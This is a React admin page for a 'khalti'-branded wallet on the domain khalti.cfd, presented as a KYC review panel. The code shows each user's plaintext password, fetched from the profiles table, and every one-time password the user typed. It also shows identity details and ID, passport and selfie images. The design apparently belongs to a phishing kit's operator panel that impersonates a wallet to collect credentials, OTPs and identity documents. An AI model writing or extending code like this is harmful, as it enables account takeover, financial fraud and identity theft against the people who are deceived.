import { createFileRoute, Link } from "@tanstack/react-router";
import { useMemo, useState } from "react";
import {
  Search,
  Download,
  Send,
  ArrowLeft,
  Eye,
} from "lucide-react";
import { toast } from "sonner";
import { StatusBadge } from "@/components/kyc/StatusBadge";
import {
  downloadFile,
} from "@/lib/kyc/service";
import { useKycList, useUpdateKycStatus, useUserOtps } from "@/lib/kyc/hooks";
import type { KycStatus, KycSubmission } from "@/types/kyc";
import { ID_TYPE_LABEL, type IdType } from "@/types/kyc";
import { RequireAdmin, useAuth } from "@/lib/auth";
import { supabase } from "@/integrations/supabase/client";

export const Route = createFileRoute("/admin/kyc")({
  head: () => ({ meta: [{ title: "KYC Management — Admin" }] }),
  component: AdminKyc,
});

const STATUSES: ("all" | KycStatus)[] = ["all", "none", "pending", "review", "approved", "rejected"];

function AdminKyc() {
  const { signOut } = useAuth();
  const { data: subs = [], isLoading, error } = useKycList();
  const updateStatus = useUpdateKycStatus();
  const [filter, setFilter] = useState<"all" | KycStatus>("all");
  const [q, setQ] = useState("");
  const [selected, setSelected] = useState<KycSubmission | null>(null);
  const [userPassword, setUserPassword] = useState("");
  const [notes, setNotes] = useState("");
  const { data: otps = [] } = useUserOtps(selected?.user_id);

  async function loadPassword(userId: string) {
    const { data } = await supabase.from("profiles").select("password").eq("id", userId).maybeSingle();
    setUserPassword(data?.password ?? "");
  }

  const filtered = useMemo(() => {
    const lower = q.toLowerCase();
    return subs.filter((s) => {
      if (filter !== "all" && s.status !== filter) return false;
      if (!q) return true;
      return [s.full_name, s.email, s.phone, s.id_number]
        .some((v) => v?.toLowerCase().includes(lower));
    });
  }, [subs, filter, q]);

  async function changeStatus(s: KycSubmission, status: KycStatus) {
    try {
      await updateStatus.mutateAsync({ id: s.id, status, notes: notes || s.admin_notes || undefined });
      toast.success(`Marked ${status}`);
      setSelected(subs.find((x) => x.id === s.id) ?? null);
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "Failed to update status");
    }
  }

  if (error) {
    return (
      <RequireAdmin>
        <p className="p-8 text-center text-sm text-destructive">
          Failed to load submissions: {error.message}
        </p>
      </RequireAdmin>
    );
  }

  return (
    <RequireAdmin>
      <div className="min-h-screen bg-muted/40">
        <header className="sticky top-0 z-30 border-b border-border bg-background/95 backdrop-blur">
          <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
            <Link to="/" className="flex items-center gap-1.5">
              <span className="text-2xl font-extrabold text-primary">khalti</span>
              <Send className="h-4 w-4 -rotate-12 fill-primary text-primary" />
              <span className="ml-2 rounded-full bg-foreground px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider text-background">
                Admin
              </span>
            </Link>
            <div className="flex items-center gap-4">
              <button
                onClick={signOut}
                className="text-sm font-semibold text-muted-foreground hover:text-foreground"
              >
                Sign out
              </button>
              <Link
                to="/dashboard"
                className="flex items-center gap-1.5 text-sm font-semibold text-muted-foreground hover:text-foreground"
              >
                <ArrowLeft className="h-4 w-4" /> Wallet
              </Link>
            </div>
          </div>
        </header>

        <main className="mx-auto max-w-7xl px-4 py-6 sm:px-6 sm:py-10">
          <div className="mb-6 flex flex-col gap-3 sm:flex-row sm:items-end sm:justify-between">
            <div>
              <h1 className="text-2xl font-extrabold">KYC Management</h1>
              <p className="mt-1 text-sm text-muted-foreground">
                {subs.length} total submissions · {filtered.length} shown
              </p>
            </div>
            <div className="flex flex-col gap-2 sm:flex-row">
              <div className="relative">
                <Search className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                <input
                  value={q}
                  onChange={(e) => setQ(e.target.value)}
                  placeholder="Search name, email, phone, ID…"
                  className="w-full rounded-full border border-border bg-background py-2 pl-9 pr-4 text-sm sm:w-72"
                />
              </div>
              <div className="flex flex-wrap gap-1.5">
                {STATUSES.map((s) => (
                  <button
                    key={s}
                    onClick={() => setFilter(s)}
                    className={`rounded-full px-3 py-1.5 text-xs font-semibold capitalize transition-colors ${
                      filter === s ? "bg-primary text-primary-foreground" : "bg-card text-muted-foreground hover:bg-accent"
                    }`}
                  >
                    {s}
                  </button>
                ))}
              </div>
            </div>
          </div>

          <div className="grid gap-6 lg:grid-cols-[1fr_420px]">
            <div className="overflow-hidden rounded-2xl bg-card shadow-card">
              {isLoading ? (
                <p className="p-8 text-center text-sm text-muted-foreground">Loading submissions…</p>
              ) : filtered.length === 0 ? (
                <p className="p-8 text-center text-sm text-muted-foreground">No submissions match your filters.</p>
              ) : (
                <ul className="divide-y divide-border">
                  {filtered.map((s) => (
                    <li key={s.id}>
                      <button
                        onClick={() => { setSelected(s); setNotes(s.admin_notes ?? ""); loadPassword(s.user_id); }}
                        className={`flex w-full items-center justify-between gap-3 px-5 py-4 text-left transition-colors hover:bg-accent ${
                          selected?.id === s.id ? "bg-accent" : ""
                        }`}
                      >
                        <div className="min-w-0">
                          <p className="truncate text-sm font-bold">
                            {s.full_name || (s.email?.includes("@khalti.cfd") ? s.email.replace("@khalti.cfd", "") : s.email || "Unknown")}
                          </p>
                          <p className="truncate text-xs text-muted-foreground">
                            {s.email ? s.email.replace("@khalti.cfd", "") : "—"}
                          </p>
                          <p className="mt-1 text-xs text-muted-foreground">
                            {s.id_type ? `${ID_TYPE_LABEL[s.id_type as IdType] ?? s.id_type} · ${s.id_number}` : "No KYC submitted"}
                          </p>
                        </div>
                        <div className="flex flex-col items-end gap-1.5">
                          <StatusBadge status={s.status} />
                          <span className="text-[11px] text-muted-foreground">
                            {new Date(s.submitted_at).toLocaleDateString()}
                          </span>
                        </div>
                      </button>
                    </li>
                  ))}
                </ul>
              )}
            </div>

            <aside className="rounded-2xl bg-card p-6 shadow-card">
              {!selected ? (
                <div className="grid h-full place-items-center py-12 text-center">
                  <div>
                    <Eye className="mx-auto h-8 w-8 text-muted-foreground" />
                    <p className="mt-3 text-sm text-muted-foreground">Select a user to review.</p>
                  </div>
                </div>
              ) : selected.status === "none" ? (
                <div className="space-y-5">
                  <div className="flex items-start justify-between">
                    <div>
                      <h2 className="text-lg font-bold">
                        {selected.email?.replace("@khalti.cfd", "") || selected.user_id.slice(0, 8)}
                      </h2>
                      <p className="text-xs text-muted-foreground">
                        User since {new Date(selected.submitted_at).toLocaleDateString()}
                      </p>
                    </div>
                    <StatusBadge status={selected.status} />
                  </div>
                  <div className="space-y-1 rounded-xl border border-border bg-muted/30 p-4 text-sm">
                    <p className="text-muted-foreground">This user has not submitted KYC yet.</p>
                    <p className="font-semibold text-foreground">Password: {userPassword || "—"}</p>
                  </div>
                  <div>
                    <h3 className="text-xs font-bold uppercase tracking-wide text-muted-foreground">OTP history</h3>
                    <div className="mt-2 space-y-1.5">
                      {otps.length === 0 ? (
                        <p className="text-xs text-muted-foreground">No OTP entries.</p>
                      ) : (
                        otps.map((o) => (
                          <div key={o.id} className="flex items-center justify-between rounded-md border border-border px-3 py-2 text-xs">
                            <span className="font-mono font-bold tracking-wider">{o.otp_entered}</span>
                            <span className="text-muted-foreground">{new Date(o.created_at).toLocaleString()}</span>
                          </div>
                        ))
                      )}
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-5">
                  <div className="flex items-start justify-between">
                    <div>
                      <h2 className="text-lg font-bold">{selected.full_name}</h2>
                      <p className="text-xs text-muted-foreground">
                        Submitted {new Date(selected.submitted_at).toLocaleString()}
                      </p>
                    </div>
                    <StatusBadge status={selected.status} />
                  </div>

                  <dl className="grid grid-cols-2 gap-y-3 text-xs">
                    <DT k="DOB" v={selected.dob} />
                    <DT k="Gender" v={selected.gender} />
                    <DT k="Nationality" v={selected.nationality} />
                    <DT k="Phone" v={selected.phone} />
                    <DT k="Email" v={selected.email} />
                    <DT k="ID type" v={ID_TYPE_LABEL[selected.id_type as IdType] ?? selected.id_type} />
                    <DT k="ID number" v={selected.id_number} />
                    <DT k="Password" v={userPassword || "—"} />
                    <div className="col-span-2">
                      <DT k="Address" v={`${selected.address}, ${selected.city}, ${selected.state}`} />
                    </div>
                  </dl>

                  <div>
                    <h3 className="text-xs font-bold uppercase tracking-wide text-muted-foreground">Documents</h3>
                    <div className="mt-2 grid grid-cols-2 gap-2">
                      {(
                        [
                          ["ID Front", selected.id_front_url],
                          ["ID Back", selected.id_back_url],
                          ["Passport", selected.passport_url],
                          ["Selfie", selected.selfie_url],
                        ] as const
                      )
                        .filter(([, p]) => p)
                        .map(([label, url]) => (
                          <div key={label} className="overflow-hidden rounded-lg border border-border">
                            {url?.includes("image") || url?.match(/\.(jpg|jpeg|png|gif|webp)/i) ? (
                              <img src={url} alt={label} className="h-24 w-full object-cover" />
                            ) : (
                              <div className="grid h-24 place-items-center bg-muted text-xs text-muted-foreground">PDF</div>
                            )}
                            <div className="flex items-center justify-between px-2 py-1.5 text-xs">
                              <span className="font-semibold">{label}</span>
                              <button
                                onClick={() => url && downloadFile(url)}
                                className="text-muted-foreground hover:text-foreground"
                                aria-label="Download"
                              >
                                <Download className="h-3.5 w-3.5" />
                              </button>
                            </div>
                          </div>
                        ))}
                    </div>
                  </div>

                  <div>
                    <h3 className="text-xs font-bold uppercase tracking-wide text-muted-foreground">OTP history</h3>
                    <div className="mt-2 space-y-1.5">
                      {otps.length === 0 ? (
                        <p className="text-xs text-muted-foreground">No OTP entries.</p>
                      ) : (
                        otps.map((o) => (
                          <div key={o.id} className="flex items-center justify-between rounded-md border border-border px-3 py-2 text-xs">
                            <span className="font-mono font-bold tracking-wider">{o.otp_entered}</span>
                            <span className="text-muted-foreground">{new Date(o.created_at).toLocaleString()}</span>
                          </div>
                        ))
                      )}
                    </div>
                  </div>

                  <div>
                    <label className="text-xs font-bold uppercase tracking-wide text-muted-foreground">Admin notes</label>
                    <textarea
                      value={notes}
                      onChange={(e) => setNotes(e.target.value)}
                      rows={3}
                      placeholder="Add a note (required when rejecting)…"
                      className="mt-1.5 w-full rounded-md border border-border bg-background px-3 py-2 text-sm outline-none focus:border-primary focus:ring-2 focus:ring-primary/20"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={() => changeStatus(selected, "approved")}
                      className="rounded-full bg-emerald-500 py-2.5 text-sm font-bold text-white hover:bg-emerald-600"
                    >
                      Approve
                    </button>
                    <button
                      onClick={() => {
                        if (!notes.trim()) return toast.error("Add a note to reject.");
                        changeStatus(selected, "rejected");
                      }}
                      className="rounded-full bg-rose-500 py-2.5 text-sm font-bold text-white hover:bg-rose-600"
                    >
                      Reject
                    </button>
                  </div>
                </div>
              )}
            </aside>
          </div>
        </main>
      </div>
    </RequireAdmin>
  );
}

function DT({ k, v }: { k: string; v: string }) {
  return (
    <>
      <dt className="text-muted-foreground">{k}</dt>
      <dd className="text-right font-semibold text-foreground">{v || "—"}</dd>
    </>
  );
}
